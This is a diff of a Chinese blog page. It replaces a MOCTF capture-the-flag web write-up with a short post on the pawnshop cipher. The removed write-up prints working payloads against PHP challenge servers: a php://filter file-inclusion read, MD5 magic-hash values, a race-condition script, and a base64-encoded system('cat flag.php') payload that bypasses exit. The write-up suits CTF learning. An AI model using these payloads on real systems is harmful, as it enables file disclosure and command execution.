@@ -98,25 +98,16 @@
 
   <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="moctf-wp">
-<meta property="og:url" content="http://yoursite.com/2019/04/20/moctf-wp/index.html">
+<meta property="og:title" content="当铺密码">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/一些密码学知识点/index.html">
 <meta property="og:site_name" content="Natsu">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/v2-0caeb8091f8adfc91dd16517ee714647.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421195757.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200031.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200453.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421201510.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421202100.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191029.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191722.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421193118.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190422212049.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190422212334.png">
-<meta property="og:updated_time" content="2019-04-21T12:40:20.000Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/132393529822720e9e8758b279cb0a46f31fab05.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190422204745.png">
+<meta property="og:updated_time" content="2019-04-25T12:28:12.038Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="moctf-wp">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/v2-0caeb8091f8adfc91dd16517ee714647.jpg">
+<meta name="twitter:title" content="当铺密码">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/132393529822720e9e8758b279cb0a46f31fab05.jpg">
 
 
 
@@ -124,7 +115,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/04/20/moctf-wp/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/22/一些密码学知识点/">
 
 
 
@@ -134,7 +125,7 @@
   };
 </script>
 
-  <title>moctf-wp | Natsu</title>
+  <title>当铺密码 | Natsu</title>
   
 
 
@@ -345,7 +336,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/20/moctf-wp/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/一些密码学知识点/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="shiki">
@@ -362,7 +353,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">moctf-wp
+          <h1 class="post-title" itemprop="name headline">当铺密码
 
               
             
@@ -388,7 +379,7 @@
                 
               
 
-              <time title="创建时间：2019-04-20 22:29:37" itemprop="dateCreated datePublished" datetime="2019-04-20T22:29:37+08:00">2019-04-20</time>
+              <time title="创建时间：2019-04-22 20:44:58" itemprop="dateCreated datePublished" datetime="2019-04-22T20:44:58+08:00">2019-04-22</time>
             
 
             
@@ -405,7 +396,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-04-21 20:40:20" itemprop="dateModified" datetime="2019-04-21T20:40:20+08:00">2019-04-21</time>
+                <time title="修改时间：2019-04-25 20:28:12" itemprop="dateModified" datetime="2019-04-25T20:28:12+08:00">2019-04-25</time>
               
             
           </span>
@@ -439,114 +430,13 @@
       
 
       
-        <p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/v2-0caeb8091f8adfc91dd16517ee714647.jpg" alt></p>
+        <p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/132393529822720e9e8758b279cb0a46f31fab05.jpg" alt></p>
 <a id="more"></a>
-<h1 id="MOCTF"><a href="#MOCTF" class="headerlink" title="MOCTF"></a>MOCTF</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="还是水题"><a href="#还是水题" class="headerlink" title="还是水题"></a>还是水题</h2><blockquote>
-<h3 id="知识点：修改html标签属性"><a href="#知识点：修改html标签属性" class="headerlink" title="知识点：修改html标签属性"></a>知识点：<em>修改html标签属性</em></h3></blockquote>
-<p>打开题目，要求在输入框内输入moctf，但是无法输入。</p>
-<p>所以f12查看器，找到输入框的属性<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421195757.png" alt><br>删掉</p>
-<pre><code>disabled=&quot;disabled&quot;
-</code></pre><p>并改maxlength=”5”，然后输入moctf得到flag。</p>
-<h2 id="我想要钱"><a href="#我想要钱" class="headerlink" title="我想要钱"></a>我想要钱</h2><blockquote>
-<h3 id="知识点：php的科学记数法，time-函数"><a href="#知识点：php的科学记数法，time-函数" class="headerlink" title="知识点：php的科学记数法，time()函数"></a>知识点：<em>php的科学记数法</em>，<em>time()函数</em></h3></blockquote>
-<p>打开题目，一道代码审计：<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200031.png" alt><br>time()函数返回当前的unix时间戳。<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200453.png" alt><br>money应该少于等于四位且大于当前的unix时间戳。那么它大概有多大呢？<br>将当前时间转换为时间戳：1555848362，是个十位的大数。  要让最多四位的money大于这个数，就要用到科学记数法。</p>
-<p>payload：</p>
-<pre><code>?money=1e10
-</code></pre><p>得到flag。</p>
-<h3 id="关于科学计数法"><a href="#关于科学计数法" class="headerlink" title="关于科学计数法"></a>关于科学计数法</h3><p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421201510.png" alt></p>
-<h4 id="P-S-虽然在excel中1-00E-10是正确写法，但1e10好像也并非是错误的。"><a href="#P-S-虽然在excel中1-00E-10是正确写法，但1e10好像也并非是错误的。" class="headerlink" title="P.S. 虽然在excel中1.00E+10是正确写法，但1e10好像也并非是错误的。"></a>P.S. 虽然在excel中1.00E+10是正确写法，但1e10好像也并非是错误的。</h4><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
-<h3 id="知识点：文件包含，phpfilter协议流"><a href="#知识点：文件包含，phpfilter协议流" class="headerlink" title="知识点：文件包含，phpfilter协议流"></a>知识点：<em>文件包含</em>，<em>phpfilter协议流</em></h3></blockquote>
-<p>打开题目，url为<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421202100.png" alt>说明可利用文件包含。在源代码注释中发现有</p>
-<pre><code>&lt;!--flag.php--&gt;
-</code></pre><p>直接访问没有发现flag。</p>
-<p>于是使用filter协议，构造payload:</p>
-<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre><p>得到一串base64：</p>
-<pre><code>SSBoYXZlIGEgZmxhZyEKPD9waHAgCgovL0ZsYWc6IG1vY3Rme2YxbGVfaW5jbHVkNF9lNXN5fQovL0J5OmRhb3l1YW4KCj8+Cg== 
-</code></pre><p>解码得到flag。</p>
-<h4 id="P-S-base64编码前为php代码会被直接执行，而编码后可以读取。"><a href="#P-S-base64编码前为php代码会被直接执行，而编码后可以读取。" class="headerlink" title="P.S. base64编码前为php代码会被直接执行，而编码后可以读取。"></a>P.S. base64编码前为php代码会被直接执行，而编码后可以读取。</h4><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
-<h2 id="php黑魔法"><a href="#php黑魔法" class="headerlink" title="php黑魔法"></a>php黑魔法</h2><blockquote>
-<h3 id="知识点：php-源码泄露"><a href="#知识点：php-源码泄露" class="headerlink" title="知识点：php~源码泄露"></a>知识点：<em>php~源码泄露</em></h3></blockquote>
-<p>hint：好像有源码</p>
-<p>猜测应该是源码泄露。于是尝试各种方法，最终发现index.php~中f12查看到源代码。</p>
-<pre><code>&lt;?php
-$flag=&quot;moctf{**************}&quot;;
+<h1 id="当铺密码-最近做题时发现了一个很有意思的密码"><a href="#当铺密码-最近做题时发现了一个很有意思的密码" class="headerlink" title="当铺密码 最近做题时发现了一个很有意思的密码"></a>当铺密码 最近做题时发现了一个很有意思的密码</h1><p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190422204745.png" alt></p>
+<p>一开始没有看懂百科中“有多少笔画出头”的意思，后来才想明白并不是与笔画数有数学关系，而是字面意义上的“出头” ORZ ，也就是说有多少笔画是“延伸出去的”。</p>
+<p>如“王”，有6个笔画“延伸出去”，于是明文就为6。以此类推。</p>
+<p># </p>
 
-if (isset($_GET[&apos;a&apos;])&amp;&amp;isset($_GET[&apos;b&apos;])) {
-    $a=$_GET[&apos;a&apos;];
-    $b=$_GET[&apos;b&apos;];
-
-
-    if($a==$b) 
-    {
-        echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;;
-    }
-    else {
-        if(md5($a)==md5($b)) 
-        {
-            echo &quot;&lt;center&gt;&quot;.$flag.&quot;&lt;/center&gt;&quot;; 
-            echo &quot;By:daoyuan&quot;;
-        }
-        else echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;;
-    }
-
-}
-else echo &quot;&lt;center&gt;濂藉儚灏戜簡鐐逛粈涔�&lt;/center&gt;&quot;; 
-?&gt;
-</code></pre><p>要求a与b的值不同而md5的值相同，构造payload：</p>
-<blockquote>
-<p><a href="http://119.23.73.3:5001/web5/index.php?a=QNKCDZO&amp;b=240610708" target="_blank" rel="noopener">http://119.23.73.3:5001/web5/index.php?a=QNKCDZO&amp;b=240610708</a></p>
-</blockquote>
-<p>得到flag。</p>
-<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</a></p>
-<h2 id="没时间解释了"><a href="#没时间解释了" class="headerlink" title="没时间解释了"></a>没时间解释了</h2><blockquote>
-<h3 id="知识点：302跳转，条件竞争"><a href="#知识点：302跳转，条件竞争" class="headerlink" title="知识点：302跳转，条件竞争"></a>知识点：<em>302跳转</em>，<em>条件竞争</em></h3></blockquote>
-<p>打开题目链接，跳转到index2.php。考虑到一般都是直接index.php，所以尝试一下，发现还是会跳转到index2。猜测可能是302跳转。<br><br>burp抓包。action-&gt;Send to Repeater将index2改为index，Go。<br><br>访问uploadsomething.php<br>试着随便传了下文件，得知要得到flag就要访问给出的文件路径。<br>访问路径，却显示“Too Slow！”<br><br>这里卡了好久，后来想到应该是上传后立刻服务器将文件删除。此处就可以利用条件竞争漏洞。<br></p>
-<ul>
-<li>使用burp不停上传文件</li>
-<li>使用脚本不停访问文件<br>上传如图内容<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191029.png" alt>取得路径：<a href="http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233</a><br><h3 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h3>burp抓包 action-&gt;send to intruder</li>
-<li>clear $</li>
-<li>payload type:null payloads</li>
-<li>payload options -&gt; continue indefinitely</li>
-<li>number of threads:20<h3 id="py脚本"><a href="#py脚本" class="headerlink" title="py脚本"></a>py脚本</h3>脚本如下：<br></li>
-</ul>
-<pre><code>import requests
-u = &quot;http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233&quot;
-t = requests.get(u).text
-while True:
-    print(t)
-</code></pre><p>得到flag。<br>moctf{y0u_n4ed_f4st}  </p>
-<h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><p>条件竞争漏洞<br><br><a href="https://www.0dayhack.com/post-666.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-666.html</a><br><a href="https://blog.csdn.net/qq_36992198/article/details/80007405" target="_blank" rel="noopener">https://blog.csdn.net/qq_36992198/article/details/80007405</a></p>
-<h2 id="死亡退出"><a href="#死亡退出" class="headerlink" title="死亡退出"></a>死亡退出</h2><blockquote>
-<h3 id="知识点：base64绕过php-exit"><a href="#知识点：base64绕过php-exit" class="headerlink" title="知识点：base64绕过php exit"></a>知识点：<em>base64绕过php exit</em></h3></blockquote>
-<p>打开题目，发现直接给出一段代码。<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191722.png" alt><br><br>可以看到$c初始值为”&lt;?php exit; ?&gt;”，然后.=我们post进去的c值。</p>
-<p>即：</p>
-<pre><code>&lt;?php
-    exit;
-?&gt;
-xxxxx
-</code></pre><p>其中xxxxx是我们传进去的数据。</p>
-<p>所以无论我们传入什么数据，$c的头部都会是一段exit，直接退出脚本。那么，现在的问题就是如何绕过这段exit了。</p>
-<p>经百度得知，可以使用phpfilter协议流进行绕过。<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421193118.png" alt><br>于是构造payload</p>
-<pre><code>c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php
-</code></pre><p>利用hackbar，post，成功绕过。</p>
-<h3 id="附-1"><a href="#附-1" class="headerlink" title="附"></a>附</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
-<h2 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h2><blockquote>
-<h3 id="知识点：py脚本"><a href="#知识点：py脚本" class="headerlink" title="知识点：py脚本"></a>知识点：<em>py脚本</em></h3></blockquote>
-<p>打开题目，<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190422212049.png" alt></p>
-<p>得知要写脚本。当前页面为index.php，点击提交跳转到work.php，又f12中看到提交的为answer。</p>
-<p>上脚本</p>
-<pre><code>import requests
-url = &quot;http://119.23.73.3:5001/web10/index.php&quot;
-s = requests.session()
-t = s.get(url).text
-num = t.count(&quot;moctf&quot;)-1
-data = {&quot;answer&quot;:num}
-url2 = &quot;http://119.23.73.3:5001/web10/work.php&quot;
-a = s.post(url2,data = data).text
-print(a)
-</code></pre><p>得到flag<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190422212334.png" alt></p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1>
       
     </div>
 
@@ -580,7 +470,7 @@ print(a)
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     
-    <a href="http://yoursite.com/2019/04/20/moctf-wp/" title="moctf-wp">http://yoursite.com/2019/04/20/moctf-wp/</a>
+    <a href="http://yoursite.com/2019/04/22/一些密码学知识点/" title="当铺密码">http://yoursite.com/2019/04/22/一些密码学知识点/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -606,14 +496,18 @@ print(a)
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/04/20/读书笔记-记录/" rel="next" title="读书笔记/记录">
+                <i class="fa fa-chevron-left"></i> 读书笔记/记录
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/04/20/读书笔记-记录/" rel="prev" title="读书笔记/记录">
-                读书笔记/记录 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/04/25/一些php知识点/" rel="prev" title="一些php知识点">
+                一些php知识点 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -790,7 +684,7 @@ print(a)
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MOCTF"><span class="nav-number">1.</span> <span class="nav-text">MOCTF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#还是水题"><span class="nav-number">2.1.</span> <span class="nav-text">还是水题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点：修改html标签属性"><span class="nav-number">2.1.1.</span> <span class="nav-text">知识点：修改html标签属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我想要钱"><span class="nav-number">2.2.</span> <span class="nav-text">我想要钱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点：php的科学记数法，time-函数"><span class="nav-number">2.2.1.</span> <span class="nav-text">知识点：php的科学记数法，time()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于科学计数法"><span class="nav-number">2.2.2.</span> <span class="nav-text">关于科学计数法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#P-S-虽然在excel中1-00E-10是正确写法，但1e10好像也并非是错误的。"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">P.S. 虽然在excel中1.00E+10是正确写法，但1e10好像也并非是错误的。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">2.3.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点：文件包含，phpfilter协议流"><span class="nav-number">2.3.1.</span> <span class="nav-text">知识点：文件包含，phpfilter协议流</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#P-S-base64编码前为php代码会被直接执行，而编码后可以读取。"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">P.S. base64编码前为php代码会被直接执行，而编码后可以读取。</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">2.3.2.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php黑魔法"><span class="nav-number">2.4.</span> <span class="nav-text">php黑魔法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点：php-源码泄露"><span class="nav-number">2.4.1.</span> <span class="nav-text">知识点：php~源码泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">2.4.2.</span> <span class="nav-text">参考：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#没时间解释了"><span class="nav-number">2.5.</span> <span class="nav-text">没时间解释了</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点：302跳转，条件竞争"><span class="nav-number">2.5.1.</span> <span class="nav-text">知识点：302跳转，条件竞争</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#burp"><span class="nav-number">2.5.2.</span> <span class="nav-text">burp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#py脚本"><span class="nav-number">2.5.3.</span> <span class="nav-text">py脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#附"><span class="nav-number">2.5.4.</span> <span class="nav-text">附</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#死亡退出"><span class="nav-number">2.6.</span> <span class="nav-text">死亡退出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点：base64绕过php-exit"><span class="nav-number">2.6.1.</span> <span class="nav-text">知识点：base64绕过php exit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#附-1"><span class="nav-number">2.6.2.</span> <span class="nav-text">附</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#火眼金睛"><span class="nav-number">2.7.</span> <span class="nav-text">火眼金睛</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#知识点：py脚本"><span class="nav-number">2.7.1.</span> <span class="nav-text">知识点：py脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-number">4.</span> <span class="nav-text">REVERSE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">5.</span> <span class="nav-text">CRYPTO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">6.</span> <span class="nav-text">PWN</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#当铺密码-最近做题时发现了一个很有意思的密码"><span class="nav-number">1.</span> <span class="nav-text">当铺密码 最近做题时发现了一个很有意思的密码</span></a></li></ol></div>
             
 
           </div>
